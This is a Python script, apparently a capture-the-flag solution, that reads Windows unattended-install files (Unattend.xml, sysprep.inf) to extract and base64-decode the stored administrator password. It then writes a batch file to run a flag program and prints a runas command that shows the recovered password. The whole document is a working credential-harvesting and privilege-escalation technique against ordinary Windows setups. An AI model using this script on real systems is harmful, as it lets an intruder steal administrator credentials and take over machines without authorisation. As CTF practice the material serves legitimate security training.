import time
import os
import re
import base64

# Fix padding if needed
def fix_base64_padding(s):
    return s + "=" * ((4 - len(s) % 4) % 4)

# Step 1: Search for unattended installation files
search_paths = [
    r"C:\Windows\Panther\Unattend.xml", # here is the encoded password
    r"C:\Windows\System32\sysprep\sysprep.inf",
    r"C:\Windows\System32\sysprep\Unattend.xml"
]

password = None

print("[*] Searching for admin password...")

for path in search_paths:
    if os.path.exists(path):
        with open(path, "r", errors="ignore") as f:
            contents = f.read()
            match = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", contents, re.DOTALL)
            if match:
                encoded_password = match.group(1).strip()
                print(f"[+] Extracted (raw): {encoded_password}")

                # Try to decode it
                try:
                    encoded_password = fix_base64_padding(encoded_password)
                    decoded_password = base64.b64decode(encoded_password).decode("utf-8")
                    password = decoded_password
                except Exception as e:
                    print(f"[!] Could not decode password, using raw value. Error: {e}")
                    password = encoded_password
                break

if password:
    # Step 2: Create getflag.bat with piped input
    bat_content = '''@echo off
REM pipe a blank line into flag.exe so it uses the default username
"C:\\Users\\SuperAdministrator\\Desktop\\flag.exe" > "C:\\Users\\Public\\flag.txt" 2>&1
'''

    bat_path = r"C:\Users\Public\getflag.bat"
    try:
        with open(bat_path, "w") as f:
            f.write(bat_content)
        print(f"[>] Batch file created: {bat_path}")
    except Exception as e:
        print(f"[!] Failed to write batch file: {e}")

    # Step 3: Print instructions
    print("[>] In a new cmd use the command below to run it with admin privileges:")
    print(f"    runas /user:SuperAdministrator \"{bat_path}\"")
    print(f"[>] Administrator Password: {password}")
    print("[!] A new all black cmd will be prompt. Provide your github user and press enter")
    print("[!] Then read the output from: C:\\Users\\Public\\flag.txt")
else:
    print("[-] Administrator password not found.")

time.sleep(10)
